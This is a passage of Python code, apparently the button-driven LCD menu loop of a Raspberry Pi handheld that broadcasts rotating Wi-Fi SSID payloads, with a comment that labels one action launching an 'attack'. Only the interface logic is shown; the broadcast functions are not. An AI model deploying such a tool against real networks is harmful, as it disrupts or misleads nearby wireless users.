        GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)

    LCD_Config.GPIO_Init()
    lcd = LCD_1in44.LCD()
    lcd.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
    lcd.LCD_Clear()
    font_obj = scaled_font()

    # Auto-detect interface
    _iface = select_interface(lcd, font_obj, PINS, GPIO, iface_type="wifi")
    if not _iface:
        GPIO.cleanup()
        return 1

    menu_sel = 0
    cat_sel = 0
    cat_scroll = 0
    dev_scroll = 0
    alert_scroll = 0
    last_rotation = time.time()

    try:
        while _running:
            btn = get_button(PINS, GPIO)

            # --- Broadcast auto-rotation ---
            if broadcasting and active_payloads and _iface:
                if time.time() - last_rotation >= rotation_interval:
                    _rotate_ssid(_iface)
                    last_rotation = time.time()

            # --- Menu view ---
            if view == "menu":
                if btn == "KEY3":
                    break
                elif btn == "UP":
                    menu_sel = max(0, menu_sel - 1)
                    time.sleep(0.15)
                elif btn == "DOWN":
                    menu_sel = min(5, menu_sel + 1)
                    time.sleep(0.15)
                elif btn == "OK":
                    if menu_sel == 0:
                        view = "categories"
                        cat_sel = 0
                        cat_scroll = 0
                    elif menu_sel == 1:
                        if not broadcasting:
                            if _iface:
                                threading.Thread(target=_start_broadcast, args=(_iface,), daemon=True).start()
                                view = "broadcast"
                                last_rotation = time.time()
                            else:
                                status_msg = "No interface!"
                        else:
                            _stop_broadcast()
                    elif menu_sel == 2:
                        view = "devices"
                        dev_scroll = 0
                    elif menu_sel == 3:
                        view = "alerts"
                        alert_scroll = 0
                    elif menu_sel == 4:
                        rotation_interval = rotation_interval + 5
                        if rotation_interval > 30:
                            rotation_interval = 1
                    elif menu_sel == 5:
                        # Cycle interface
                        if ifaces:
                            cur = next((i for i, x in enumerate(ifaces) if x["name"] == _iface), 0)
                            _iface = ifaces[(cur + 1) % len(ifaces)]["name"]
                    time.sleep(0.3)

                _draw_menu(lcd, font_obj, menu_sel)

            # --- Categories view ---
            elif view == "categories":
                if btn == "KEY3":
                    view = "menu"
                    time.sleep(0.3)
                elif btn == "UP":
                    cat_sel = max(0, cat_sel - 1)
                    if cat_sel < cat_scroll:
                        cat_scroll = cat_sel
                    time.sleep(0.15)
                elif btn == "DOWN":
                    cat_sel = min(len(CAT_NAMES) - 1, cat_sel + 1)
                    if cat_sel >= cat_scroll + ROWS_VISIBLE:
                        cat_scroll = cat_sel - ROWS_VISIBLE + 1
                    time.sleep(0.15)
                elif btn == "OK":
                    cat = CAT_NAMES[cat_sel]
                    selected_cats = dict(selected_cats)
                    selected_cats[cat] = not selected_cats[cat]
                    time.sleep(0.2)
                elif btn == "KEY1":
                    # Toggle all
                    all_on = all(selected_cats.values())
                    selected_cats = {c: not all_on for c in CAT_NAMES}
                    time.sleep(0.3)
                elif btn == "KEY2":
                    # Launch attack directly from categories
                    if _iface and not broadcasting:
                        threading.Thread(target=_start_broadcast, args=(_iface,), daemon=True).start()
                        view = "broadcast"
                        last_rotation = time.time()
                    time.sleep(0.3)

                if view == "categories":
                    _draw_categories(lcd, font_obj, cat_sel, cat_scroll)

            # --- Broadcast view ---
            elif view == "broadcast":
                if btn == "KEY3" or btn == "OK":
                    _stop_broadcast()
                    view = "menu"
                    time.sleep(0.3)
                elif btn == "RIGHT":
                    if active_payloads and _iface:
                        _rotate_ssid(_iface)
                        last_rotation = time.time()
                    time.sleep(0.2)
                elif btn == "LEFT":
                    if active_payloads and _iface:
                        current_idx = (current_idx - 2) % len(active_payloads)
                        _rotate_ssid(_iface)
                        last_rotation = time.time()
                    time.sleep(0.2)

                _draw_broadcast(lcd, font_obj)

            # --- Devices view ---
            elif view == "devices":
                if btn == "KEY3":
                    view = "menu"
                    time.sleep(0.3)
                elif btn == "UP":
                    dev_scroll = max(0, dev_scroll - 1)
                    time.sleep(0.15)
                elif btn == "DOWN":
                    dev_scroll = min(max(0, len(devices) - 5), dev_scroll + 1)
                    time.sleep(0.15)

                _draw_devices(lcd, font_obj, dev_scroll)

            # --- Alerts view ---
            elif view == "alerts":
                if btn == "KEY3":
                    view = "menu"
                    time.sleep(0.3)
                elif btn == "UP":
                    alert_scroll = max(0, alert_scroll - 1)
                    time.sleep(0.15)
                elif btn == "DOWN":
                    alert_scroll = min(max(0, len(alerts) - 3), alert_scroll + 1)
                    time.sleep(0.15)

                _draw_alerts(lcd, font_obj, alert_scroll)

            time.sleep(0.05)

    finally:
        _running = False
        if broadcasting:
            _stop_broadcast()
        time.sleep(0.3)
        try:
            lcd.LCD_Clear()
        except Exception:
            pass
        GPIO.cleanup()

    return 0


if __name__ == "__main__":
    raise SystemExit(main())
